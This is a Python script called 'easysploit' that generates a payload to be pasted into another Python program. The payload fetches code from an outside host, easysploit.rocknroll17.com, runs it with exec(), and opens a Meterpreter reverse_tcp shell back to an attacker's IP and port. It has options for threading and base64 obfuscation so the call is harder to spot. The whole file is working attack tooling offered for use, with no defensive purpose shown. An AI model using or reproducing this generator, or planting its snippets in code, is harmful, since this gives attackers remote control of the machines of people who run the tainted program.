import argparse
import base64

HELP_MESSAGE = """

███████╗ █████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
█████╗  ███████║███████╗ ╚████╔╝ ███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████╗██║  ██║███████║   ██║   ███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                              

This script generates a fileless payload that can be used to execute a meterpreter reverse_tcp payload on a target machine.
The generated code should be pasted in the target python code.

Usage:
python3 easysploit.py <IP> <PORT> [-a] [-t] [-e] [-f <INPUT FILE>] [-o <OUTPUT FILE>]
python3 easysploit.py <IP> <PORT> [--admin] [--threading] [--encoding] [-f <INPUT FILE>] [--output <OUTPUT FILE>] 
"""

"""
Arguments:
<IP>: IP address of the attacker machine.
<PORT>: Port number to listen on.
-a or --admin: Include admin feature code.
-t or --threading: Include threading code.
-e or --encoding: Include base64 encoding.
-f or --file: Input file with IP and PORT pairs.
-o or --output: Output file to save the code.
-h or --help: Show this help message.
"""

parser = argparse.ArgumentParser(description=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
parser.add_argument('ip', type=str, nargs='?', help='IP address')
parser.add_argument('port', type=int, nargs='?', help='Port number')
parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')
parser.add_argument('-t', '--threading', action='store_true', help='Include threading')
parser.add_argument('-e', '--encoding', action='store_true', help='Include base64 encoding')
parser.add_argument('-f', '--file', type=str, help='Input file with IP and PORT pairs')
parser.add_argument('-o', '--output', type=str, help='Output file to save the code')
parser.add_argument('-h', '--help', action='help', help='Show this help message')

args = parser.parse_args()

if args.file:
    if args.ip or args.port:
        print("Error: IP and PORT should not be specified when using -f.")
        exit()
else:
    if not args.ip or not args.port:
        print("Error: IP and PORT must be specified when not using -f.")
        exit()

def generate_command(ip, port, admin_path, threading, encoding):
    command = ""
    command += "import urllib.request, json\n"
    if threading:
        command += "import threading\nthreading.Thread(target=lambda: "
    command += f"""exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{ip}", "LPORT": {port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())"""
    if threading:
        command += ").start()"
    if encoding:
        encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
        command = f"exec(__import__('base64').b64decode('{encoded_command}').decode('utf-8'))"
    return command

admin_path = "/admin" if args.admin else ""

if args.file:
    with open(args.file, 'r') as f:
        lines = f.readlines()
    commands = [generate_command(*line.strip().split(), admin_path, args.threading, args.encoding) for line in lines]
    command = "\n\n".join(commands)
else:
    command = generate_command(args.ip, args.port, admin_path, args.threading, args.encoding)

if args.output:
    with open(args.output, 'w') as f:
        f.write(command)
else:
    print("Copy the following code and paste it in the target python code:")
    print("================================================================")
    print(command)